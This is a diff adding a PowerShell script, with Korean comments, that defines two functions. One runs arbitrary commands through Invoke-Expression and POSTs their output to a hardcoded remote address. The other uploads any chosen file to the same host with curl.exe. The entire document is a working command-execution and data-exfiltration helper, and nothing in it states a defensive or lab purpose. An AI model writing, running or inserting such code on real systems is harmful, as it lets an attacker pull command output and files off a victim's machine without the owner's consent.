@@ -1,0 +1,14 @@
+function send-data {
+    param($Cmd, $BaseUrl = "http://1.1.1.1:12345")
+    # 확장자 있으면 그대로, 없으면 .txt 붙이기
+    $bin     = ($Cmd -split " ")[0]
+    $fname   = if ($bin -match '\.') { $bin } else { $bin + ".txt" }
+    $result  = "===cmd: $Cmd===`r`n" + (Invoke-Expression $Cmd | Out-String)
+    curl.exe -s -X POST "$BaseUrl/$fname" -d $result
+}
+
+function send-file {
+    param($FilePath, $BaseUrl = "http://1.1.1.1:12345")
+    $fname = Split-Path $FilePath -Leaf   # 원본 파일명 + 확장자 그대로
+    curl.exe -s -X POST "$BaseUrl/$fname" -F "file=@$FilePath"
+}
